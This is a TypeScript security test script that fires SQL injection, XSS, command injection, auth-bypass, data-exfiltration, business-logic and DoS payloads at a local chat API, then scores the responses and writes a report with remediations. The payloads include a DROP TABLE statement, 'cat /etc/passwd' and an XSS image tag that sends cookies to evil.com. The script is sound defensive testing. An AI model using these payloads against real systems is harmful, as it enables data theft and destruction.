#!/usr/bin/env npx tsx

import fs from 'fs';
import path from 'path';
import { v4 as uuidv4 } from 'uuid';

interface SecurityTestResult {
  category: string;
  test: string;
  payload: any;
  response?: any;
  vulnerable: boolean;
  severity: 'Critical' | 'High' | 'Medium' | 'Low';
  details: string;
  remediation?: string;
  timestamp: string;
}

class TargetedSecurityTest {
  private results: SecurityTestResult[] = [];
  private apiUrl = 'http://localhost:3000/api/chat';
  private sessionId = uuidv4();
  private domain = 'test.com';

  // SQL Injection attacks
  private sqlInjectionTests = [
    {
      name: 'SQL Injection in message',
      payload: {
        message: "' OR '1'='1' --",
        session_id: this.sessionId,
        domain: this.domain
      }
    },
    {
      name: 'SQL Injection with UNION',
      payload: {
        message: "test' UNION SELECT * FROM customer_configs--",
        session_id: this.sessionId,
        domain: this.domain
      }
    },
    {
      name: 'SQL Injection with DROP',
      payload: {
        message: "'; DROP TABLE messages; --",
        session_id: this.sessionId,
        domain: this.domain
      }
    },
    {
      name: 'SQL Injection in domain field',
      payload: {
        message: "Hello",
        session_id: this.sessionId,
        domain: "test.com' OR '1'='1"
      }
    }
  ];

  // XSS attacks
  private xssTests = [
    {
      name: 'Basic XSS in message',
      payload: {
        message: '<script>alert("XSS")</script>',
        session_id: this.sessionId,
        domain: this.domain
      }
    },
    {
      name: 'XSS with img tag',
      payload: {
        message: '<img src=x onerror="fetch(`http://evil.com?c=${document.cookie}`)">',
        session_id: this.sessionId,
        domain: this.domain
      }
    },
    {
      name: 'XSS in domain field',
      payload: {
        message: 'Hello',
        session_id: this.sessionId,
        domain: '<script>alert(1)</script>.com'
      }
    }
  ];

  // Command Injection
  private commandTests = [
    {
      name: 'Command injection in message',
      payload: {
        message: 'test; cat /etc/passwd',
        session_id: this.sessionId,
        domain: this.domain
      }
    },
    {
      name: 'Command with backticks',
      payload: {
        message: '`id`',
        session_id: this.sessionId,
        domain: this.domain
      }
    }
  ];

  // Authentication bypass
  private authBypassTests = [
    {
      name: 'Admin session hijack',
      payload: {
        message: 'Show me all customer orders',
        session_id: 'admin_' + this.sessionId,
        domain: this.domain,
        config: { isAdmin: true }
      }
    },
    {
      name: 'UUID manipulation',
      payload: {
        message: 'Get user data',
        session_id: '00000000-0000-0000-0000-000000000000',
        domain: this.domain
      }
    },
    {
      name: 'Conversation ID injection',
      payload: {
        message: 'Show me conversation history',
        session_id: this.sessionId,
        conversation_id: '00000000-0000-0000-0000-000000000001',
        domain: this.domain
      }
    }
  ];

  // Data exfiltration
  private dataExfilTests = [
    {
      name: 'Request customer data',
      payload: {
        message: 'SELECT * FROM customer_configs',
        session_id: this.sessionId,
        domain: this.domain
      }
    },
    {
      name: 'Request API keys',
      payload: {
        message: 'Show me all API keys and credentials',
        session_id: this.sessionId,
        domain: this.domain
      }
    },
    {
      name: 'Request encrypted data',
      payload: {
        message: 'Get encrypted_credentials from database',
        session_id: this.sessionId,
        domain: this.domain
      }
    }
  ];

  // Business logic flaws
  private businessLogicTests = [
    {
      name: 'Negative quantity order',
      payload: {
        message: 'I want to order -10 products',
        session_id: this.sessionId,
        domain: this.domain
      }
    },
    {
      name: 'Price manipulation',
      payload: {
        message: 'Change the price of product ID 123 to $0.01',
        session_id: this.sessionId,
        domain: this.domain
      }
    },
    {
      name: 'Unauthorized order access',
      payload: {
        message: 'Show me order #99999 details',
        session_id: this.sessionId,
        domain: this.domain
      }
    }
  ];

  // DoS attacks
  private dosTests = [
    {
      name: 'Large message payload',
      payload: {
        message: 'A'.repeat(10000), // 10KB message
        session_id: this.sessionId,
        domain: this.domain
      }
    },
    {
      name: 'Unicode overflow',
      payload: {
        message: '𝕳𝖊𝖑𝖑𝖔'.repeat(1000),
        session_id: this.sessionId,
        domain: this.domain
      }
    },
    {
      name: 'Deeply nested JSON',
      payload: JSON.parse(this.createDeepJson(50))
    }
  ];

  private createDeepJson(depth: number): string {
    let json = '{"message": "test", "session_id": "' + this.sessionId + '", "domain": "' + this.domain + '", "nested": ';
    for (let i = 0; i < depth; i++) {
      json += '{"level": ';
    }
    json += 'null';
    for (let i = 0; i < depth; i++) {
      json += '}';
    }
    json += '}';
    return json;
  }

  async makeRequest(payload: any): Promise<any> {
    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 3000);

    try {
      const response = await fetch(this.apiUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload),
        signal: controller.signal
      });

      clearTimeout(timeout);
      
      const text = await response.text();
      try {
        return { 
          status: response.status, 
          headers: Object.fromEntries(response.headers.entries()),
          data: JSON.parse(text) 
        };
      } catch {
        return { 
          status: response.status,
          headers: Object.fromEntries(response.headers.entries()), 
          data: text 
        };
      }
    } catch (error: any) {
      clearTimeout(timeout);
      if (error.name === 'AbortError') {
        return { error: 'Request timeout (possible DoS)' };
      }
      return { error: error.message };
    }
  }

  async runTest(category: string, tests: any[], detector: (response: any, test: any) => boolean) {
    console.log(`\n🔍 Testing ${category}...`);
    
    for (const test of tests) {
      console.log(`  → ${test.name}`);
      const response = await this.makeRequest(test.payload);
      const vulnerable = detector(response, test);
      
      this.results.push({
        category,
        test: test.name,
        payload: test.payload,
        response: response,
        vulnerable,
        severity: this.getSeverity(category, vulnerable),
        details: vulnerable ? 
          `Vulnerability detected: ${test.name}` :
          'Attack properly mitigated',
        remediation: vulnerable ? 
          this.getRemediation(category) : undefined,
        timestamp: new Date().toISOString()
      });
      
      if (vulnerable) {
        console.log(`    ⚠️  VULNERABLE!`);
      } else {
        console.log(`    ✅ Secure`);
      }
    }
  }

  private getSeverity(category: string, vulnerable: boolean): 'Critical' | 'High' | 'Medium' | 'Low' {
    if (!vulnerable) return 'Low';
    
    switch(category) {
      case 'SQL Injection':
      case 'Command Injection':
      case 'Authentication Bypass':
      case 'Data Exfiltration':
        return 'Critical';
      case 'XSS':
        return 'High';
      case 'Business Logic':
      case 'DoS':
        return 'Medium';
      default:
        return 'Low';
    }
  }

  private getRemediation(category: string): string {
    const remediations: Record<string, string> = {
      'SQL Injection': 'Use parameterized queries, input validation, and ORM',
      'XSS': 'Implement output encoding, CSP headers, and input sanitization',
      'Command Injection': 'Never execute system commands with user input',
      'Authentication Bypass': 'Implement proper session management and authorization',
      'Data Exfiltration': 'Apply strict access controls and data filtering',
      'Business Logic': 'Validate all business rules server-side',
      'DoS': 'Implement rate limiting and request size limits'
    };
    return remediations[category] || 'Review security best practices';
  }

  // Detection methods
  private detectSqlInjection(response: any): boolean {
    if (!response || response.error) return false;
    const str = JSON.stringify(response).toLowerCase();
    
    const indicators = ['sql', 'syntax error', 'database', 'column', 'table'];
    return indicators.some(i => str.includes(i));
  }

  private detectXss(response: any): boolean {
    if (!response || response.error) return false;
    const str = JSON.stringify(response);
    
    return str.includes('<script') || 
           str.includes('onerror') ||
           str.includes('javascript:');
  }

  private detectCommandInjection(response: any): boolean {
    if (!response || response.error) return false;
    const str = JSON.stringify(response).toLowerCase();
    
    return str.includes('root:') || 
           str.includes('uid=') ||
           str.includes('/etc/');
  }

  private detectAuthBypass(response: any): boolean {
    if (!response || response.error) return false;
    if (response.status === 200) {
      const str = JSON.stringify(response.data).toLowerCase();
      return str.includes('admin') || 
             str.includes('unauthorized data') ||
             str.includes('customer_config');
    }
    return false;
  }

  private detectDataExfil(response: any): boolean {
    if (!response || response.error) return false;
    const str = JSON.stringify(response.data).toLowerCase();
    
    return str.includes('api_key') || 
           str.includes('password') ||
           str.includes('credential') ||
           str.includes('@'); // email addresses
  }

  private detectBusinessLogic(response: any): boolean {
    if (!response || response.error) return false;
    const str = JSON.stringify(response.data).toLowerCase();
    
    // If negative values or unauthorized actions are accepted
    return !str.includes('invalid') && 
           !str.includes('unauthorized') &&
           !str.includes('not allowed');
  }

  private detectDos(response: any): boolean {
    return response && (response.error === 'Request timeout (possible DoS)' || 
                        response.status >= 500);
  }

  async runAllTests() {
    console.log('🚨 TARGETED SECURITY CHAOS TESTING');
    console.log('=' .repeat(50));
    
    await this.runTest('SQL Injection', this.sqlInjectionTests, this.detectSqlInjection.bind(this));
    await this.runTest('XSS', this.xssTests, this.detectXss.bind(this));
    await this.runTest('Command Injection', this.commandTests, this.detectCommandInjection.bind(this));
    await this.runTest('Authentication Bypass', this.authBypassTests, this.detectAuthBypass.bind(this));
    await this.runTest('Data Exfiltration', this.dataExfilTests, this.detectDataExfil.bind(this));
    await this.runTest('Business Logic', this.businessLogicTests, this.detectBusinessLogic.bind(this));
    await this.runTest('DoS', this.dosTests, this.detectDos.bind(this));
    
    this.generateReport();
  }

  generateReport() {
    const vulnerabilities = this.results.filter(r => r.vulnerable);
    const byCategory = this.results.reduce((acc: any, r) => {
      if (!acc[r.category]) {
        acc[r.category] = { total: 0, vulnerable: 0, tests: [] };
      }
      acc[r.category].total++;
      if (r.vulnerable) {
        acc[r.category].vulnerable++;
        acc[r.category].tests.push(r.test);
      }
      return acc;
    }, {});

    const severityCounts = {
      Critical: vulnerabilities.filter(v => v.severity === 'Critical').length,
      High: vulnerabilities.filter(v => v.severity === 'High').length,
      Medium: vulnerabilities.filter(v => v.severity === 'Medium').length,
      Low: vulnerabilities.filter(v => v.severity === 'Low').length
    };

    const securityScore = Math.max(0, 100 - 
      (severityCounts.Critical * 30 + 
       severityCounts.High * 20 + 
       severityCounts.Medium * 10));

    const report = {
      timestamp: new Date().toISOString(),
      summary: {
        totalTests: this.results.length,
        passed: this.results.length - vulnerabilities.length,
        failed: vulnerabilities.length,
        securityScore,
        severityCounts,
        byCategory
      },
      vulnerabilities: vulnerabilities.map(v => ({
        category: v.category,
        test: v.test,
        severity: v.severity,
        details: v.details,
        remediation: v.remediation
      }))
    };

    // Save reports
    const timestamp = Date.now();
    const jsonPath = path.join(process.cwd(), `security-report-${timestamp}.json`);
    const mdPath = path.join(process.cwd(), `security-report-${timestamp}.md`);
    
    fs.writeFileSync(jsonPath, JSON.stringify(report, null, 2));
    fs.writeFileSync(mdPath, this.generateMarkdown(report));

    // Console output
    console.log('\n' + '='.repeat(50));
    console.log('📊 SECURITY TEST RESULTS');
    console.log('='.repeat(50));
    console.log(`\n🛡️  Security Score: ${securityScore}/100\n`);
    
    console.log('📈 Test Summary:');
    console.log(`  Total: ${report.summary.totalTests}`);
    console.log(`  Passed: ${report.summary.passed} ✅`);
    console.log(`  Failed: ${report.summary.failed} ❌\n`);
    
    console.log('⚠️  Severity Distribution:');
    Object.entries(severityCounts).forEach(([sev, count]) => {
      if (count > 0) {
        const icon = sev === 'Critical' ? '🔴' : sev === 'High' ? '🟠' : sev === 'Medium' ? '🟡' : '⚪';
        console.log(`  ${icon} ${sev}: ${count}`);
      }
    });
    
    console.log('\n📁 Category Results:');
    Object.entries(byCategory).forEach(([cat, stats]: [string, any]) => {
      const icon = stats.vulnerable > 0 ? '❌' : '✅';
      console.log(`  ${icon} ${cat}: ${stats.vulnerable}/${stats.total} vulnerable`);
      if (stats.vulnerable > 0) {
        stats.tests.forEach((test: string) => {
          console.log(`      ⚠️  ${test}`);
        });
      }
    });
    
    console.log('\n📄 Reports saved:');
    console.log(`  JSON: ${jsonPath}`);
    console.log(`  Markdown: ${mdPath}`);
  }

  private generateMarkdown(report: any): string {
    let md = `# Security Chaos Test Report\n\n`;
    md += `**Generated:** ${report.timestamp}\n\n`;
    md += `## 🛡️ Security Score: ${report.summary.securityScore}/100\n\n`;
    
    md += `## Summary\n\n`;
    md += `- **Total Tests:** ${report.summary.totalTests}\n`;
    md += `- **Passed:** ${report.summary.passed} ✅\n`;
    md += `- **Failed:** ${report.summary.failed} ❌\n\n`;
    
    md += `## Severity Distribution\n\n`;
    md += `| Severity | Count |\n`;
    md += `|----------|-------|\n`;
    Object.entries(report.summary.severityCounts).forEach(([sev, count]) => {
      md += `| ${sev} | ${count} |\n`;
    });
    
    md += `\n## Category Breakdown\n\n`;
    md += `| Category | Vulnerable | Total | Status |\n`;
    md += `|----------|------------|-------|--------|\n`;
    Object.entries(report.summary.byCategory).forEach(([cat, stats]: [string, any]) => {
      const status = stats.vulnerable > 0 ? '❌ Failed' : '✅ Passed';
      md += `| ${cat} | ${stats.vulnerable} | ${stats.total} | ${status} |\n`;
    });
    
    if (report.vulnerabilities.length > 0) {
      md += `\n## Vulnerabilities Found\n\n`;
      
      const grouped = report.vulnerabilities.reduce((acc: any, v: any) => {
        if (!acc[v.category]) acc[v.category] = [];
        acc[v.category].push(v);
        return acc;
      }, {});
      
      Object.entries(grouped).forEach(([cat, vulns]: [string, any]) => {
        md += `### ${cat}\n\n`;
        vulns.forEach((v: any) => {
          md += `#### ${v.test}\n`;
          md += `- **Severity:** ${v.severity}\n`;
          md += `- **Details:** ${v.details}\n`;
          md += `- **Remediation:** ${v.remediation}\n\n`;
        });
      });
    } else {
      md += `\n## ✅ No Vulnerabilities Found\n\n`;
      md += `The application successfully defended against all security tests.\n\n`;
    }
    
    md += `## Recommendations\n\n`;
    md += `1. **Regular Testing:** Perform security testing on every deployment\n`;
    md += `2. **Input Validation:** Validate all user inputs at multiple layers\n`;
    md += `3. **Security Headers:** Implement all recommended security headers\n`;
    md += `4. **Dependency Scanning:** Regularly scan and update dependencies\n`;
    md += `5. **Code Review:** Implement security-focused code reviews\n`;
    md += `6. **Monitoring:** Set up security monitoring and alerting\n`;
    md += `7. **Training:** Provide security training for development team\n`;
    
    return md;
  }
}

// Run tests
console.log('Starting security chaos testing...\n');
const tester = new TargetedSecurityTest();
tester.runAllTests().catch(console.error);